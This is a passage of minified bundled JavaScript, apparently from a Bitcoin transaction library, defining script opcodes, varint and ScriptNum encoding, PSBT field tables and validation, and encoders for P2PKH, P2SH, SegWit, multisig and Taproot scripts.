            (e[(e.CHECKSIGVERIFY = 173)] = "CHECKSIGVERIFY"),
            (e[(e.CHECKMULTISIG = 174)] = "CHECKMULTISIG"),
            (e[(e.CHECKMULTISIGVERIFY = 175)] = "CHECKMULTISIGVERIFY"),
            (e[(e.NOP1 = 176)] = "NOP1"),
            (e[(e.CHECKLOCKTIMEVERIFY = 177)] = "CHECKLOCKTIMEVERIFY"),
            (e[(e.CHECKSEQUENCEVERIFY = 178)] = "CHECKSEQUENCEVERIFY"),
            (e[(e.NOP4 = 179)] = "NOP4"),
            (e[(e.NOP5 = 180)] = "NOP5"),
            (e[(e.NOP6 = 181)] = "NOP6"),
            (e[(e.NOP7 = 182)] = "NOP7"),
            (e[(e.NOP8 = 183)] = "NOP8"),
            (e[(e.NOP9 = 184)] = "NOP9"),
            (e[(e.NOP10 = 185)] = "NOP10"),
            (e[(e.CHECKSIGADD = 186)] = "CHECKSIGADD"),
            (e[(e.INVALID = 255)] = "INVALID");
        })(Pn || (Pn = {}));
        const _n = Dt({
          encodeStream: (e, t) => {
            for (let n of t) {
              if ("string" === typeof n) {
                if (void 0 === Pn[n]) throw new Error(`Unknown opcode=${n}`);
                e.byte(Pn[n]);
                continue;
              }
              if ("number" === typeof n) {
                if (0 === n) {
                  e.byte(0);
                  continue;
                }
                if (1 <= n && n <= 16) {
                  e.byte(Pn.OP_1 - 1 + n);
                  continue;
                }
              }
              if (
                ("number" === typeof n && (n = Un().encode(BigInt(n))), !dn(n))
              )
                throw new Error(`Wrong Script OP=${n} (${typeof n})`);
              const t = n.length;
              t < Pn.PUSHDATA1
                ? e.byte(t)
                : t <= 255
                ? (e.byte(Pn.PUSHDATA1), e.byte(t))
                : t <= 65535
                ? (e.byte(Pn.PUSHDATA2), e.bytes(Jt.encode(t)))
                : (e.byte(Pn.PUSHDATA4), e.bytes(Gt.encode(t))),
                e.bytes(n);
            }
          },
          decodeStream: (e) => {
            const t = [];
            for (; !e.isEnd(); ) {
              const n = e.byte();
              if (Pn.OP_0 < n && n <= Pn.PUSHDATA4) {
                let r;
                if (n < Pn.PUSHDATA1) r = n;
                else if (n === Pn.PUSHDATA1) r = Xt.decodeStream(e);
                else if (n === Pn.PUSHDATA2) r = Jt.decodeStream(e);
                else {
                  if (n !== Pn.PUSHDATA4)
                    throw new Error("Should be not possible");
                  r = Gt.decodeStream(e);
                }
                t.push(e.bytes(r));
              } else if (0 === n) t.push(0);
              else if (Pn.OP_1 <= n && n <= Pn.OP_16) t.push(n - (Pn.OP_1 - 1));
              else {
                const e = Pn[n];
                if (void 0 === e)
                  throw new Error(`Unknown opcode=${n.toString(16)}`);
                t.push(e);
              }
            }
            return t;
          },
        });
        function Un() {
          let e =
              arguments.length > 0 && void 0 !== arguments[0]
                ? arguments[0]
                : 6,
            t = arguments.length > 1 && void 0 !== arguments[1] && arguments[1];
          return Dt({
            encodeStream: (e, t) => {
              if (0n === t) return;
              const n = t < 0,
                r = BigInt(t),
                i = [];
              for (let o = n ? -r : r; o; o >>= 8n) i.push(Number(0xffn & o));
              i[i.length - 1] >= 128
                ? i.push(n ? 128 : 0)
                : n && (i[i.length - 1] |= 128),
                e.bytes(new Uint8Array(i));
            },
            decodeStream: (n) => {
              const r = n.leftBytes;
              if (r > e)
                throw new Error(
                  `ScriptNum: number (${r}) bigger than limit=${e}`
                );
              if (0 === r) return 0n;
              if (
                t &&
                0 === (127 & n.data[r - 1]) &&
                (r <= 1 || 0 === (128 & n.data[r - 2]))
              )
                throw new Error("Non-minimally encoded ScriptNum");
              let i = 0,
                o = 0n;
              for (let e = 0; e < r; ++e)
                (i = n.byte()), (o |= BigInt(i) << (8n * BigInt(e)));
              return (
                i >= 128 && ((o &= (2n ** BigInt(8 * r) - 1n) >> 1n), (o = -o)),
                o
              );
            },
          });
        }
        const Nn = {
            253: [253, 2, 253n, 65535n],
            254: [254, 4, 65536n, 4294967295n],
            255: [255, 8, 4294967296n, 18446744073709551615n],
          },
          Rn = Dt({
            encodeStream: (e, t) => {
              if (
                ("number" === typeof t && (t = BigInt(t)), 0n <= t && t <= 252n)
              )
                return e.byte(Number(t));
              for (const [n, r, i, o] of Object.values(Nn))
                if (!(i > t || t > o)) {
                  e.byte(n);
                  for (let n = 0; n < r; n++)
                    e.byte(Number((t >> (8n * BigInt(n))) & 0xffn));
                  return;
                }
              throw e.err(`VarInt too big: ${t}`);
            },
            decodeStream: (e) => {
              const t = e.byte();
              if (t <= 252) return BigInt(t);
              const [n, r, i] = Nn[t];
              let o = 0n;
              for (let s = 0; s < r; s++)
                o |= BigInt(e.byte()) << (8n * BigInt(s));
              if (o < i) throw e.err(`Wrong CompactSize(${8 * r})`);
              return o;
            },
          }),
          Ln = tn(Rn, jt.number),
          $n = (e) => an(Rn, e),
          Hn = Qt(Rn),
          Dn = sn({
            txid: Qt(32, !0),
            index: Gt,
            finalScriptSig: Hn,
            sequence: Gt,
          }),
          Mn = sn({ amount: Wt, script: Hn }),
          Fn = { amount: 0xffffffffffffffffn, script: Bt },
          jn = an(Ln, Hn),
          zn = sn({
            version: Zt,
            segwitFlag: (function (e) {
              let t =
                arguments.length > 1 && void 0 !== arguments[1] && arguments[1];
              return Dt({
                size: e.length,
                encodeStream: (n, r) => {
                  !!r !== t && n.bytes(e);
                },
                decodeStream: (n) => {
                  let r = n.leftBytes >= e.length;
                  return (
                    r &&
                      ((r = _t(n.bytes(e.length, !0), e)),
                      r && n.bytes(e.length)),
                    r !== t
                  );
                },
              });
            })(new Uint8Array([0, 1])),
            inputs: $n(Dn),
            outputs: $n(Mn),
            witnesses: (function (e, t, n) {
              if (!Ft(t)) throw new Error(`flagged: invalid inner value ${t}`);
              return Dt({
                encodeStream: (r, i) => {
                  "string" === typeof e
                    ? Mt(r.path, e.split("/"))
                      ? t.encodeStream(r, i)
                      : n && t.encodeStream(r, n)
                    : (e.encodeStream(r, !!i),
                      i ? t.encodeStream(r, i) : n && t.encodeStream(r, n));
                },
                decodeStream: (r) => {
                  let i = !1;
                  if (
                    ((i =
                      "string" === typeof e
                        ? Mt(r.path, e.split("/"))
                        : e.decodeStream(r)),
                    i)
                  )
                    return t.decodeStream(r);
                  n && t.decodeStream(r);
                },
              });
            })("segwitFlag", an("inputs/length", jn)),
            lockTime: Gt,
          });
        const Kn = nn(zn, function (e) {
          if (e.segwitFlag && e.witnesses && !e.witnesses.length)
            throw new Error("Segwit flag with empty witnesses array");
          return e;
        });
        function Wn(e) {
          const [t, n, r, i, o, s] = e;
          return {
            type: t,
            kc: n,
            vc: r,
            reqInc: i,
            allowInc: o,
            silentIgnore: s,
          };
        }
        const Vn = sn({ fingerprint: Yt, path: an(null, Gt) }),
          qn = nn(
            sn({
              version: Xt,
              internalKey: Qt(32),
              merklePath: an(null, Qt(32)),
            }),
            (e) => {
              if (e.merklePath.length > 128)
                throw new Error(
                  "TaprootControlBlock: merklePath should be of length 0..128 (inclusive)"
                );
              return e;
            }
          ),
          Gn = sn({ hashes: an(Ln, Qt(32)), der: Vn }),
          Yn = Qt(78),
          Zn = sn({ pubKey: kn, leafHash: Qt(32) }),
          Jn = an(null, sn({ depth: Xt, version: Xt, script: Hn })),
          Xn = Qt(null),
          Qn = Qt(20),
          er = Qt(32),
          tr = {
            unsignedTx: [0, !1, Kn, [0], [0], !1],
            xpub: [1, Yn, Vn, [], [0, 2], !1],
            txVersion: [2, !1, Gt, [2], [2], !1],
            fallbackLocktime: [3, !1, Gt, [], [2], !1],
            inputCount: [4, !1, Ln, [2], [2], !1],
            outputCount: [5, !1, Ln, [2], [2], !1],
            txModifiable: [6, !1, Xt, [], [2], !1],
            version: [251, !1, Gt, [], [0, 2], !1],
            propietary: [252, Xn, Xn, [], [0, 2], !1],
          },
          nr = {
            nonWitnessUtxo: [0, !1, Kn, [], [0, 2], !1],
            witnessUtxo: [1, !1, Mn, [], [0, 2], !1],
            partialSig: [2, An, Xn, [], [0, 2], !1],
            sighashType: [3, !1, Gt, [], [0, 2], !1],
            redeemScript: [4, !1, Xn, [], [0, 2], !1],
            witnessScript: [5, !1, Xn, [], [0, 2], !1],
            bip32Derivation: [6, An, Vn, [], [0, 2], !1],
            finalScriptSig: [7, !1, Xn, [], [0, 2], !1],
            finalScriptWitness: [8, !1, jn, [], [0, 2], !1],
            porCommitment: [9, !1, Xn, [], [0, 2], !1],
            ripemd160: [10, Qn, Xn, [], [0, 2], !1],
            sha256: [11, er, Xn, [], [0, 2], !1],
            hash160: [12, Qn, Xn, [], [0, 2], !1],
            hash256: [13, er, Xn, [], [0, 2], !1],
            txid: [14, !1, er, [2], [2], !0],
            index: [15, !1, Gt, [2], [2], !0],
            sequence: [16, !1, Gt, [], [2], !0],
            requiredTimeLocktime: [17, !1, Gt, [], [2], !1],
            requiredHeightLocktime: [18, !1, Gt, [], [2], !1],
            tapKeySig: [19, !1, Tn, [], [0, 2], !1],
            tapScriptSig: [20, Zn, Tn, [], [0, 2], !1],
            tapLeafScript: [21, qn, Xn, [], [0, 2], !1],
            tapBip32Derivation: [22, er, Gn, [], [0, 2], !1],
            tapInternalKey: [23, !1, kn, [], [0, 2], !1],
            tapMerkleRoot: [24, !1, er, [], [0, 2], !1],
            propietary: [252, Xn, Xn, [], [0, 2], !1],
          },
          rr = [
            "txid",
            "sequence",
            "index",
            "witnessUtxo",
            "nonWitnessUtxo",
            "finalScriptSig",
            "finalScriptWitness",
            "unknown",
          ],
          ir = [
            "partialSig",
            "finalScriptSig",
            "finalScriptWitness",
            "tapKeySig",
            "tapScriptSig",
          ],
          or = {
            redeemScript: [0, !1, Xn, [], [0, 2], !1],
            witnessScript: [1, !1, Xn, [], [0, 2], !1],
            bip32Derivation: [2, An, Vn, [], [0, 2], !1],
            amount: [3, !1, Vt, [2], [2], !0],
            script: [4, !1, Xn, [2], [2], !0],
            tapInternalKey: [5, !1, kn, [], [0, 2], !1],
            tapTree: [6, !1, Jn, [], [0, 2], !1],
            tapBip32Derivation: [7, kn, Gn, [], [0, 2], !1],
            propietary: [252, Xn, Xn, [], [0, 2], !1],
          },
          sr = [],
          ar = an(
            Pt,
            sn({
              key: (function (e, t) {
                if (!Ft(t)) throw new Error(`prefix: invalid inner value ${t}`);
                if (Nt(e)) throw new Error("prefix: len cannot be Uint8Array");
                const n = Qt(e);
                return Dt({
                  size: "number" === typeof e ? e : void 0,
                  encodeStream: (e, r) => {
                    const i = new Lt(e.path, e.fieldPath);
                    t.encodeStream(i, r), n.encodeStream(e, i.buffer);
                  },
                  decodeStream: (e) => {
                    const r = n.decodeStream(e);
                    return t.decodeStream(new Rt(r, e.path, e.fieldPath));
                  },
                });
              })(Ln, sn({ type: Ln, key: Qt(null) })),
              value: Qt(Ln),
            })
          );
        sn({ type: Ln, key: Qt(null) });
        function lr(e) {
          const t = {};
          for (const n in e) {
            const [r, i, o] = e[n];
            t[r] = [n, i, o];
          }
          return Dt({
            encodeStream: (t, n) => {
              let r = [];
              for (const i in e) {
                const t = n[i];
                if (void 0 === t) continue;
                const [o, s, a] = e[i];
                if (s) {
                  const e = t.map((e) => {
                    let [t, n] = e;
                    return [s.encode(t), a.encode(n)];
                  });
                  e.sort((e, t) => Bn(e[0], t[0]));
                  for (const [t, n] of e)
                    r.push({ key: { key: t, type: o }, value: n });
                } else
                  r.push({ key: { type: o, key: Bt }, value: a.encode(t) });
              }
              if (n.unknown) {
                n.unknown.sort((e, t) => Bn(e[0].key, t[0].key));
                for (const [e, t] of n.unknown) r.push({ key: e, value: t });
              }
              ar.encodeStream(t, r);
            },
            decodeStream: (e) => {
              const n = ar.decodeStream(e),
                r = {},
                i = {};
              for (const o of n) {
                let e = "unknown",
                  n = o.key.key,
                  s = o.value;
                if (t[o.key.type]) {
                  const [a, l, c] = t[o.key.type];
                  if (((e = a), !l && n.length))
                    throw new Error(
                      `PSBT: Non-empty key for ${e} (key=${Ot.$v.encode(
                        n
                      )} value=${Ot.$v.encode(s)}`
                    );
                  if (((n = l ? l.decode(n) : void 0), (s = c.decode(s)), !l)) {
                    if (r[e])
                      throw new Error(
                        `PSBT: Same keys: ${e} (key=${n} value=${s})`
                      );
                    (r[e] = s), (i[e] = !0);
                    continue;
                  }
                } else n = { type: o.key.type, key: o.key.key };
                if (i[e])
                  throw new Error(
                    `PSBT: Key type with empty key and no key=${e} val=${s}`
                  );
                r[e] || (r[e] = []), r[e].push([n, s]);
              }
              return r;
            },
          });
        }
        function cr(e, t) {
          if (!_t(e.hash, dt(t)))
            throw new Error("checkScript: wsh wrong witnessScript hash");
          const n = Hr.decode(t);
          if ("tr" === n.type || "tr_ns" === n.type || "tr_ms" === n.type)
            throw new Error(
              `checkScript: P2${n.type} cannot be wrapped in P2SH`
            );
          if ("wpkh" === n.type || "sh" === n.type)
            throw new Error(
              `checkScript: P2${n.type} cannot be wrapped in P2WSH`
            );
        }
        function ur(e, t, n) {
          if (e) {
            const r = Hr.decode(e);
            if (
              "tr_ns" === r.type ||
              "tr_ms" === r.type ||
              "ms" === r.type ||
              "pk" == r.type
            )
              throw new Error(`checkScript: non-wrapped ${r.type}`);
            if ("sh" === r.type && t) {
              if (!_t(r.hash, pn(t)))
                throw new Error("checkScript: sh wrong redeemScript hash");
              const e = Hr.decode(t);
              if ("tr" === e.type || "tr_ns" === e.type || "tr_ms" === e.type)
                throw new Error(
                  `checkScript: P2${e.type} cannot be wrapped in P2SH`
                );
              if ("sh" === e.type)
                throw new Error("checkScript: P2SH cannot be wrapped in P2SH");
            }
            "wsh" === r.type && n && cr(r, n);
          }
          if (t) {
            const e = Hr.decode(t);
            "wsh" === e.type && n && cr(e, n);
          }
        }
        const fr = nn(lr(nr), (e) => {
            if (e.finalScriptWitness && !e.finalScriptWitness.length)
              throw new Error("validateInput: wmpty finalScriptWitness");
            if (e.partialSig && !e.partialSig.length)
              throw new Error("Empty partialSig");
            if (e.partialSig)
              for (const [t, n] of e.partialSig) bn(t, mn.ecdsa);
            if (e.bip32Derivation)
              for (const [t, n] of e.bip32Derivation) bn(t, mn.ecdsa);
            if (
              void 0 !== e.requiredTimeLocktime &&
              e.requiredTimeLocktime < 5e8
            )
              throw new Error(
                `validateInput: wrong timeLocktime=${e.requiredTimeLocktime}`
              );
            if (
              void 0 !== e.requiredHeightLocktime &&
              (e.requiredHeightLocktime <= 0 || e.requiredHeightLocktime >= 5e8)
            )
              throw new Error(
                `validateInput: wrong heighLocktime=${e.requiredHeightLocktime}`
              );
            if (e.nonWitnessUtxo && void 0 !== e.index) {
              const t = e.nonWitnessUtxo.outputs.length - 1;
              if (e.index > t)
                throw new Error(
                  `validateInput: index(${e.index}) not in nonWitnessUtxo`
                );
              const n = e.nonWitnessUtxo.outputs[e.index];
              if (
                e.witnessUtxo &&
                (!_t(e.witnessUtxo.script, n.script) ||
                  e.witnessUtxo.amount !== n.amount)
              )
                throw new Error(
                  "validateInput: witnessUtxo different from nonWitnessUtxo"
                );
            }
            if (e.tapLeafScript)
              for (const [t, n] of e.tapLeafScript) {
                if ((254 & t.version) !== n[n.length - 1])
                  throw new Error(
                    "validateInput: tapLeafScript version mimatch"
                  );
                if (1 & n[n.length - 1])
                  throw new Error(
                    "validateInput: tapLeafScript version has parity bit!"
                  );
              }
            if (e.nonWitnessUtxo && e.index && e.txid) {
              if (e.nonWitnessUtxo.outputs.length - 1 < e.index)
                throw new Error("nonWitnessUtxo: incorect output index");
              const t = Xr.fromRaw(Kn.encode(e.nonWitnessUtxo)),
                n = Ot.$v.encode(e.txid);
              if (t.id !== n)
                throw new Error(
                  `nonWitnessUtxo: wrong txid, exp=${n} got=${t.id}`
                );
            }
            return e;
          }),
          hr = nn(lr(or), (e) => {
            if (e.bip32Derivation)
              for (const [t, n] of e.bip32Derivation) bn(t, mn.ecdsa);
            return e;
          }),
          dr = nn(lr(tr), (e) => {
            if (0 === (e.version || 0)) {
              if (!e.unsignedTx) throw new Error("PSBTv0: missing unsignedTx");
              if (e.unsignedTx.segwitFlag || e.unsignedTx.witnesses)
                throw new Error("PSBTv0: witness in unsingedTx");
              for (const t of e.unsignedTx.inputs)
                if (t.finalScriptSig && t.finalScriptSig.length)
                  throw new Error(
                    "PSBTv0: input scriptSig found in unsignedTx"
                  );
            }
            return e;
          }),
          pr = sn({
            magic: rn(en(new Uint8Array([255])), "psbt"),
            global: dr,
            inputs: an("global/unsignedTx/inputs/length", fr),
            outputs: an(null, hr),
          }),
          gr = sn({
            magic: rn(en(new Uint8Array([255])), "psbt"),
            global: dr,
            inputs: an("global/inputCount", fr),
            outputs: an("global/outputCount", hr),
          });
        sn({
          magic: rn(en(new Uint8Array([255])), "psbt"),
          items: an(
            null,
            tn(
              an(
                Pt,
                (function (e) {
                  if (!Array.isArray(e))
                    throw new Error(
                      `Packed.Tuple: got ${typeof e} instead of array`
                    );
                  return Dt({
                    size: on(e),
                    encodeStream: (t, n) => {
                      if (!Array.isArray(n))
                        throw t.err(`tuple: invalid value ${n}`);
                      t.path.push(n);
                      for (let r = 0; r < e.length; r++)
                        t.fieldPathPush("" + r),
                          e[r].encodeStream(t, n[r]),
                          t.fieldPathPop();
                      t.path.pop();
                    },
                    decodeStream: (t) => {
                      let n = [];
                      t.path.push(n);
                      for (let r = 0; r < e.length; r++)
                        t.fieldPathPush("" + r),
                          n.push(e[r].decodeStream(t)),
                          t.fieldPathPop();
                      return t.path.pop(), n;
                    },
                  });
                })([
                  (function (e) {
                    let t =
                      arguments.length > 2 &&
                      void 0 !== arguments[2] &&
                      arguments[2];
                    const n = Qt(
                      e,
                      arguments.length > 1 &&
                        void 0 !== arguments[1] &&
                        arguments[1]
                    );
                    return Dt({
                      size: n.size,
                      encodeStream: (e, r) => {
                        if (t && !r.startsWith("0x"))
                          throw new Error(
                            "hex(withZero=true).encode input should start with 0x"
                          );
                        const i = Ot.$v.decode(t ? r.slice(2) : r);
                        return n.encodeStream(e, i);
                      },
                      decodeStream: (e) =>
                        (t ? "0x" : "") + Ot.$v.encode(n.decodeStream(e)),
                    });
                  })(Ln),
                  Qt(Rn),
                ])
              ),
              jt.dict()
            )
          ),
        });
        function yr(e, t, n) {
          for (const r in n) {
            if ("unknown" === r) continue;
            if (!t[r]) continue;
            const { allowInc: n } = Wn(t[r]);
            if (!n.includes(e))
              throw new Error(`PSBTv${e}: field ${r} is not allowed`);
          }
          for (const r in t) {
            const { reqInc: i } = Wn(t[r]);
            if (i.includes(e) && void 0 === n[r])
              throw new Error(`PSBTv${e}: missing required field ${r}`);
          }
        }
        function wr(e, t, n) {
          const r = {};
          for (const i in n) {
            const o = i;
            if ("unknown" !== o) {
              if (!t[o]) continue;
              const { allowInc: n, silentIgnore: r } = Wn(t[o]);
              if (!n.includes(e)) {
                if (r) continue;
                throw new Error(
                  `Failed to serialize in PSBTv${e}: ${o} but versions allows inclusion=${n}`
                );
              }
            }
            r[o] = n[o];
          }
          return r;
        }
        function mr(e) {
          const t = (e && e.global && e.global.version) || 0;
          yr(t, tr, e.global);
          for (const s of e.inputs) yr(t, nr, s);
          for (const s of e.outputs) yr(t, or, s);
          const n = t ? e.global.inputCount : e.global.unsignedTx.inputs.length;
          if (e.inputs.length < n) throw new Error("Not enough inputs");
          const r = e.inputs.slice(n);
          if (r.length > 1 || (r.length && Object.keys(r[0]).length))
            throw new Error(`Unexpected inputs left in tx=${r}`);
          const i = t
            ? e.global.outputCount
            : e.global.unsignedTx.outputs.length;
          if (e.outputs.length < i) throw new Error("Not outputs inputs");
          const o = e.outputs.slice(i);
          if (o.length > 1 || (o.length && Object.keys(o[0]).length))
            throw new Error(`Unexpected outputs left in tx=${o}`);
          return e;
        }
        function br(e, t, n, r) {
          const i = { ...n, ...t };
          for (const o in e) {
            const s = o,
              [a, l, c] = e[s],
              u = r && !r.includes(o);
            if (void 0 === t[o] && o in t) {
              if (u) throw new Error(`Cannot remove signed field=${o}`);
              delete i[o];
            } else if (l) {
              const e = n && n[o] ? n[o] : [];
              let r = t[s];
              if (r) {
                if (!Array.isArray(r))
                  throw new Error(`keyMap(${o}): KV pairs should be [k, v][]`);
                r = r.map((e) => {
                  if (2 !== e.length)
                    throw new Error(
                      `keyMap(${o}): KV pairs should be [k, v][]`
                    );
                  return [
                    "string" === typeof e[0]
                      ? l.decode(Ot.$v.decode(e[0]))
                      : e[0],
                    "string" === typeof e[1]
                      ? c.decode(Ot.$v.decode(e[1]))
                      : e[1],
                  ];
                });
                const t = {},
                  n = (e, n, r) => {
                    if (void 0 === t[e]) return void (t[e] = [n, r]);
                    const i = Ot.$v.encode(c.encode(t[e][1])),
                      o = Ot.$v.encode(c.encode(r));
                    if (i !== o)
                      throw new Error(
                        `keyMap(${s}): same key=${e} oldVal=${i} newVal=${o}`
                      );
                  };
                for (const [r, i] of e) {
                  n(Ot.$v.encode(l.encode(r)), r, i);
                }
                for (const [e, i] of r) {
                  const r = Ot.$v.encode(l.encode(e));
                  if (void 0 === i) {
                    if (u)
                      throw new Error(`Cannot remove signed field=${s}/${e}`);
                    delete t[r];
                  } else n(r, e, i);
                }
                i[s] = Object.values(t);
              }
            } else if ("string" === typeof i[o])
              i[o] = c.decode(Ot.$v.decode(i[o]));
            else if (
              u &&
              o in t &&
              n &&
              void 0 !== n[o] &&
              !_t(c.encode(t[o]), c.encode(n[o]))
            )
              throw new Error(`Cannot change signed field=${o}`);
          }
          for (const o in i) e[o] || delete i[o];
          return i;
        }
        const vr = nn(pr, mr),
          Er = nn(gr, mr),
          Sr = sn({ txid: Qt(32, !0), index: Gt }),
          xr = {
            encode(e) {
              if (
                2 === e.length &&
                Nt(e[0]) &&
                vn(e[0], mn.ecdsa) &&
                "CHECKSIG" === e[1]
              )
                return { type: "pk", pubkey: e[0] };
            },
            decode: (e) => ("pk" === e.type ? [e.pubkey, "CHECKSIG"] : void 0),
          },
          Ar = {
            encode(e) {
              if (
                5 === e.length &&
                "DUP" === e[0] &&
                "HASH160" === e[1] &&
                dn(e[2]) &&
                "EQUALVERIFY" === e[3] &&
                "CHECKSIG" === e[4]
              )
                return { type: "pkh", hash: e[2] };
            },
            decode: (e) =>
              "pkh" === e.type
                ? ["DUP", "HASH160", e.hash, "EQUALVERIFY", "CHECKSIG"]
                : void 0,
          },
          kr = {
            encode(e) {
              if (
                3 === e.length &&
                "HASH160" === e[0] &&
                dn(e[1]) &&
                "EQUAL" === e[2]
              )
                return { type: "sh", hash: e[1] };
            },
            decode: (e) =>
              "sh" === e.type ? ["HASH160", e.hash, "EQUAL"] : void 0,
          },
          Tr = function (e) {
            let t =
              arguments.length > 1 && void 0 !== arguments[1]
                ? arguments[1]
                : Cn;
            const n = e.script;
            if (!dn(n))
              throw new Error(
                `Wrong script: ${typeof e.script}, expected Uint8Array`
              );
            const r = pn(n);
            ur(Hr.encode({ type: "sh", hash: r }), n, e.witnessScript);
            const i = {
              type: "sh",
              redeemScript: n,
              script: Hr.encode({ type: "sh", hash: r }),
              address: jr(t).encode({ type: "sh", hash: r }),
            };
            return e.witnessScript && (i.witnessScript = e.witnessScript), i;
          },
          Cr = {
            encode(e) {
              if (
                2 === e.length &&
                0 === e[0] &&
                dn(e[1]) &&
                32 === e[1].length
              )
                return { type: "wsh", hash: e[1] };
            },
            decode: (e) => ("wsh" === e.type ? [0, e.hash] : void 0),
          },
          Ir = {
            encode(e) {
              if (
                2 === e.length &&
                0 === e[0] &&
                dn(e[1]) &&
                20 === e[1].length
              )
                return { type: "wpkh", hash: e[1] };
            },
            decode: (e) => ("wpkh" === e.type ? [0, e.hash] : void 0),
          },
          Or = function (e) {
            let t =
              arguments.length > 1 && void 0 !== arguments[1]
                ? arguments[1]
                : Cn;
            if (!vn(e, mn.ecdsa)) throw new Error("P2WPKH: invalid publicKey");
            if (65 === e.length)
              throw new Error("P2WPKH: uncompressed public key");
            const n = pn(e);
            return {
              type: "wpkh",
              script: Hr.encode({ type: "wpkh", hash: n }),
              address: jr(t).encode({ type: "wpkh", hash: n }),
            };
          },
          Br = {
            encode(e) {
              const t = e.length - 1;
              if ("CHECKMULTISIG" !== e[t]) return;
              const n = e[0],
                r = e[t - 1];
              if ("number" !== typeof n || "number" !== typeof r) return;
              const i = e.slice(1, -2);
              if (r === i.length) {
                for (const e of i) if (!dn(e)) return;
                return { type: "ms", m: n, pubkeys: i };
              }
            },
            decode: (e) =>
              "ms" === e.type
                ? [e.m, ...e.pubkeys, e.pubkeys.length, "CHECKMULTISIG"]
                : void 0,
          },
          Pr = {
            encode(e) {
              if (2 === e.length && 1 === e[0] && dn(e[1]))
                return { type: "tr", pubkey: e[1] };
            },
            decode: (e) => ("tr" === e.type ? [1, e.pubkey] : void 0),
          };
        function _r(e) {
          let t =
            arguments.length > 1 && void 0 !== arguments[1] && arguments[1];
          if (!e) throw new Error("taprootHashTree: empty tree");
          if (
            (Array.isArray(e) && 1 === e.length && (e = e[0]),
            !Array.isArray(e))
          ) {
            const { leafVersion: n, script: r, tapInternalKey: i } = e;
            if (
              e.tapLeafScript ||
              (e.tapMerkleRoot && !_t(e.tapMerkleRoot, Bt))
            )
              throw new Error("P2TR: tapRoot leafScript cannot have tree");
            if (i && _t(i, Rr))
              throw new Error(
                "P2TR: tapRoot leafScript cannot have unspendble key"
              );
            const o = "string" === typeof r ? Ot.$v.decode(r) : r;
            if (!dn(o)) throw new Error(`checkScript: wrong script type=${o}`);
            return (
              (function (e) {
                let t =
                  arguments.length > 1 &&
                  void 0 !== arguments[1] &&
                  arguments[1];
                const n = Hr.decode(e);
                if (
                  ("unknown" !== n.type || !t) &&
                  !["tr_ns", "tr_ms"].includes(n.type)
                )
                  throw new Error(`P2TR: invalid leaf script=${n.type}`);
              })(o, t),
              {
                type: "leaf",
                tapInternalKey: i,
                version: n,
                script: o,
                hash: Yr(o, n),
              }
            );
          }
          if (
            (2 !== e.length &&
              (e = (function (e) {
                const t = Array.from(e);
                for (; t.length >= 2; ) {
                  t.sort((e, t) => (t.weight || 1) - (e.weight || 1));
                  const e = t.pop(),
                    n = t.pop(),
                    r =
                      ((null === n || void 0 === n ? void 0 : n.weight) || 1) +
                      ((null === e || void 0 === e ? void 0 : e.weight) || 1);
                  t.push({
                    weight: r,
                    childs: [
                      (null === n || void 0 === n ? void 0 : n.childs) || n,
                      (null === e || void 0 === e ? void 0 : e.childs) || e,
                    ],
                  });
                }
                const n = t[0];
                return (null === n || void 0 === n ? void 0 : n.childs) || n;
              })(e)),
            2 !== e.length)
          )
            throw new Error("hashTree: non binary tree!");
          const n = _r(e[0], t),
            r = _r(e[1], t);
          let [i, o] = [n.hash, r.hash];
          return (
            -1 === Bn(o, i) && ([i, o] = [o, i]),
            {
              type: "branch",
              left: n,
              right: r,
              hash: Ve.utils.taggedHash("TapBranch", i, o),
            }
          );
        }
        function Ur(e) {
          let t =
            arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : [];
          if (!e) throw new Error("taprootAddPath: empty tree");
          if ("leaf" === e.type) return { ...e, path: t };
          if ("branch" !== e.type)
            throw new Error(`taprootAddPath: wrong type=${e}`);
          return {
            ...e,
            path: t,
            left: Ur(e.left, [e.right.hash, ...t]),
            right: Ur(e.right, [e.left.hash, ...t]),
          };
        }
        function Nr(e) {
          if (!e) throw new Error("taprootAddPath: empty tree");
          if ("leaf" === e.type) return [e];
          if ("branch" !== e.type)
            throw new Error(`taprootWalkTree: wrong type=${e}`);
          return [...Nr(e.left), ...Nr(e.right)];
        }
        const Rr = dt(ln.BASE.toRawBytes(!1));
        function Lr(e, t) {
          let n =
              arguments.length > 2 && void 0 !== arguments[2]
                ? arguments[2]
                : Cn,
            r = arguments.length > 3 && void 0 !== arguments[3] && arguments[3];
          if (!e && !t)
            throw new Error("p2tr: should have pubKey or scriptTree (or both)");
          const i = "string" === typeof e ? Ot.$v.decode(e) : e || Rr;
          if (!vn(i, mn.schnorr)) throw new Error("p2tr: non-schnorr pubkey");
          let o = t ? Ur(_r(t, r)) : void 0;
          const s = o ? o.hash : void 0,
            [a, l] = xn(i, s || Bt);
          let c, u;
          o &&
            (c = Nr(o).map((e) => ({
              ...e,
              controlBlock: qn.encode({
                version: (e.version || Gr) + l,
                internalKey: e.tapInternalKey || i,
                merklePath: e.path,
              }),
            }))),
            c &&
              (u = c.map((e) => [
                qn.decode(e.controlBlock),
                yn(e.script, new Uint8Array([e.version || Gr])),
              ]));
          const f = {
            type: "tr",
            script: Hr.encode({ type: "tr", pubkey: a }),
            address: jr(n).encode({ type: "tr", pubkey: a }),
            tweakedPubkey: a,
            tapInternalKey: i,
          };
          return (
            c && (f.leaves = c),
            u && (f.tapLeafScript = u),
            s && (f.tapMerkleRoot = s),
            f
          );
        }
        const $r = [
            xr,
            Ar,
            kr,
            Cr,
            Ir,
            Br,
            Pr,
            {
              encode(e) {
                const t = e.length - 1;
                if ("CHECKSIG" !== e[t]) return;
                const n = [];
                for (let r = 0; r < t; r++) {
                  const i = e[r];
                  if (1 & r) {
                    if ("CHECKSIGVERIFY" !== i || r === t - 1) return;
                  } else {
                    if (!dn(i)) return;
                    n.push(i);
                  }
                }
                return { type: "tr_ns", pubkeys: n };
              },
              decode: (e) => {
                if ("tr_ns" !== e.type) return;
                const t = [];
                for (let n = 0; n < e.pubkeys.length - 1; n++)
                  t.push(e.pubkeys[n], "CHECKSIGVERIFY");
                return t.push(e.pubkeys[e.pubkeys.length - 1], "CHECKSIG"), t;
              },
            },
            {
              encode(e) {
                const t = e.length - 1;
                if ("NUMEQUAL" !== e[t] || "CHECKSIG" !== e[1]) return;
                const n = [],
                  r = (function (e) {
                    let t =
                        arguments.length > 1 && void 0 !== arguments[1]
                          ? arguments[1]
                          : 4,
                      n =
                        !(arguments.length > 2 && void 0 !== arguments[2]) ||
                        arguments[2];
                    if ("number" === typeof e) return e;
                    if (dn(e))
                      try {
